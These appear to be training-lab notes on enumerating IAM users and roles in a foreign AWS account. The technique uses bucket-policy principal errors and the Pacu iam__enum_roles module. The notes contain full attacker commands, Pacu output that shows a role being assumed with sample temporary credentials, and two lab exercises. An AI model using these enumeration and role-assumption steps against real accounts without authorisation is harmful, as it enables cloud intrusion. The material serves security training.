# Enumerating IAM Users in Other Accounts

Example of a Principal Definition Inside a policy
>``` shell
>"Principal": {
>  "AWS": ["arn:aws:iam::AccountID:user/user-name"]
>}
>```

Example of a Principal Definition Specifying the ARN of an IAM user
>``` shell
>"Principal": {
>  "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
>}
>```

Creating a S3 Bucket in the attacker's Account
>``` shell
>kali@kali:~$ aws --profile attacker s3 mb s3://offseclab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM
>
># ========== Expected Result ==========
>make_bucket: offseclab-dummy-bucket-28967-25641-13328
># =====================================
>```

Policy Granting Permission to List the Bucket to a Single IAM User
>``` shell
>kali@kali:~$ nano grant-s3-bucket-read.json
>
>kali@kali:~$ cat grant-s3-bucket-read.json
>
># ========== Expected Result ==========
>{
>    "Version": "2012-10-17",
>    "Statement": [
>        {
>            "Sid": "AllowUserToListBucket",
>            "Effect": "Allow",
>            "Resource": "arn:aws:s3:::offseclab-dummy-bucket-28967-25641-13328",
>            "Principal": {
>                "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
>            },
>            "Action": "s3:ListBucket"
>
>        }
>    ]
>}
># =====================================
>```

Attaching the Resource Based Policy to the Test Bucket
>``` shell
>kali@kali:~$ aws --profile attacker s3api put-bucket-policy --bucket offseclab-dummy-bucket-28967-25641-13328 --policy file://grant-s3-bucket-read.json 
>```

Editing the Policy Specifying a Non-existing User and Testing Again
>``` shell
>kali@kali:~$ cp grant-s3-bucket-read.json grant-s3-bucket-read-userDoNotExist.json
>
>kali@kali:~$ nano grant-s3-bucket-read-userDoNotExist.json
>
>kali@kali:~$ cat grant-s3-bucket-read-userDoNotExist.json
>
># ========== Expected Result ==========
>{
>    "Version": "2012-10-17",
>    "Statement": [
>        {
>            "Sid": "AllowUserToListBucket",
>            "Effect": "Allow",
>            "Resource": "arn:aws:s3:::offseclab-dummy-bucket-28967-25641-13328",
>            "Principal": {
>                "AWS": ["arn:aws:iam::123456789012:user/nonexistant"]
>            },
>            "Action": "s3:ListBucket"
>
>        }
>    ]
>}
># =====================================
>
>kali@kali:~$ aws --profile attacker s3api put-bucket-policy --bucket offseclab-dummy-bucket-28967-25641-13328  --policy file://grant-s3-bucket-read-userDoNotExist.json 
>
># ========== Expected Result ==========
>An error occurred (MalformedPolicy) when calling the PutBucketPolicy operation: Invalid principal in policy
># =====================================
>```

Creating a List of Roles to Search in the Account
>``` shell
>echo -n "lab_admin
>security_auditor
>content_creator
>student_access
>lab_builder
>instructor
>network_config
>monitoring_logging
>backup_restore
>content_editor" > /tmp/role-names.txt
>```

Installing pacu in Kali Linux Using the Package Manager
>``` shell
>kali@kali:~$ sudo apt update
>
>kali@kali:~$ sudo apt install pacu
>```

Getting the pacu Usage Help
>``` shell
>kali@kali:~$ pacu -h
>
># ========== Expected Result ==========
>usage: pacu [-h] [--session] [--activate-session] [--new-session] [--set-keys] [--module-name] [--data] [--module-args]
>            [--list-modules] [--pacu-help] [--module-info] [--exec] [--set-regions  [...]] [--whoami]
>
>options:
>  -h, --help            show this help message and exit
>  --session             <session name>
>  --activate-session    activate session, use session arg to set session name
>  --new-session         <session name>
>  --set-keys            alias, access id, secrect key, token
>  --module-name         <module name>
>  --data                <service name/all>
>  --module-args         <--module-args='--regions us-east-1,us-east-1'>
>  --list-modules        List arguments
>  --pacu-help           List the Pacu help window
>  --module-info         Get information on a specific module, use --module-name
>  --exec                exec module
>  --set-regions  [ ...]
>                        <region1 region2 ...> or <all> for all
>  --whoami              Display information on current IAM user
># =====================================
>```

Starting pacu in Interactive Mode
>``` shell
>kali@kali:~$ pacu
>
># ========== Expected Result ==========
>....
>Database created at /root/.local/share/pacu/sqlite.db
>
>What would you like to name this new session? offseclab
>Session offseclab created.
>
>...
>
>Pacu (offseclab:No Keys Set) > 
># =====================================
>```

Importing the attacker Profile Credentials in pacu
>``` shell
>Pacu (offseclab:No Keys Set) > import_keys attacker
>
># ========== Expected Result ==========
>  Imported keys as "imported-attacker"
>Pacu (offseclab:imported-attacker) > 
># =====================================
>```

Listing Modules in pacu
>``` shell
>Pacu (offseclab:imported-attacker) > ls
>
># ========== Expected Result ==========
>...
>[Category: RECON_UNAUTH]
>
>  iam__enum_roles
>  iam__enum_users
>
>...
># =====================================
>```

Displaying Information About iam__enum_roles Module in pacu
>``` shell
>Pacu (offseclab:imported-attacker) > help iam__enum_roles
>
># ========== Expected Result ==========
>iam__enum_roles written by Spencer Gietzen of Rhino Security Labs.
>
>usage: pacu [--word-list WORD_LIST] [--role-name ROLE_NAME] --account-id
>            ACCOUNT_ID
>
>This module takes in a valid AWS account ID and tries to enumerate existing
>IAM roles within that account. It does so by trying to update the
>AssumeRole policy document of the role that you pass into --role-name if
>passed or newlycreated role. For your safety, it updates the policy with an
>explicit deny against the AWS account/IAM role, so that no security holes
>are opened in your account during enumeration. NOTE: It is recommended to
>use personal AWS access keys for this script, as it will spam CloudTrail
>with "iam:UpdateAssumeRolePolicy" logs and a few "sts:AssumeRole" logs. The
>target account will not see anything in their logs though, unless you find
>a misconfigured role that allows you to assume it. The keys used must have
>the iam:UpdateAssumeRolePolicy permission on the role that you pass into
>--role-name to be able to identify a valid IAM role and the sts:AssumeRole
>permission to try and request credentials for any enumerated roles.
>...
># =====================================
>```

Running the enum_roles Module in pacu
>``` shell
>Pacu (offseclab:imported-attacker) > run iam__enum_roles --word-list /tmp/role-names.txt --account-id 123456789012
>
># ========== Expected Result ==========
>  Running module iam__enum_roles...
>...
>
>[iam__enum_roles] Targeting account ID: 123456789012
>
>[iam__enum_roles] Starting role enumeration...
>
>
>[iam__enum_roles]   Found role: arn:aws:iam::123456789012:role/lab_admin
>
>[iam__enum_roles] Found 1 role(s):
>
>[iam__enum_roles]     arn:aws:iam::123456789012:role/lab_admin
>
>[iam__enum_roles] Checking to see if any of these roles can be assumed for temporary credentials...
>
>[iam__enum_roles]   Role can be assumed, but hit max session time limit, reverting to minimum of 1 hour...
>
>[iam__enum_roles]   Successfully assumed role for 1 hour: arn:aws:iam::123456789012:role/lab_admin
>
>[iam__enum_roles] {
>  "Credentials": {
>    "AccessKeyId": "ASIAQOMAIGYUWZXRMMO2",
>    "SecretAccessKey": "2UU80dtizqx3DUa9mn6033AjXKb13GXOMCy+tOUt",
>    "SessionToken": "FwoGZXIvYXdzEO///////////wEaDCv5...",
>    "Expiration": "2023-08-18 22:07:49+00:00"
>  },
>  "AssumedRoleUser": {
>    "AssumedRoleId": "AROAQOMAIGYUR5KMGWT7V:dCkQ0O1y6n9KSQmGBaKJ",
>    "Arn": "arn:aws:sts::123456789012:assumed-role/lab_admin/dCkQ0O1y6n9KSQmGBaKJ"
>  }
>}
>Cleaning up the PacuIamEnumRoles-XbsIV role.
># =====================================
>```

Lab 1 - Enumerate other roles by creating a new list with the keywords: "saphire", "ruby", and "amethyst" following a dash and one of the custom name roles we created before. Write the name of the role we can assume.
>``` shell
>
>```
>

Lab 2 - Assume the role you found in the previous exercise and list (describe) all available VPCs using the role privileges. You will find the proof in a tag of one of the VPCs.
>``` shell
>
>```
>
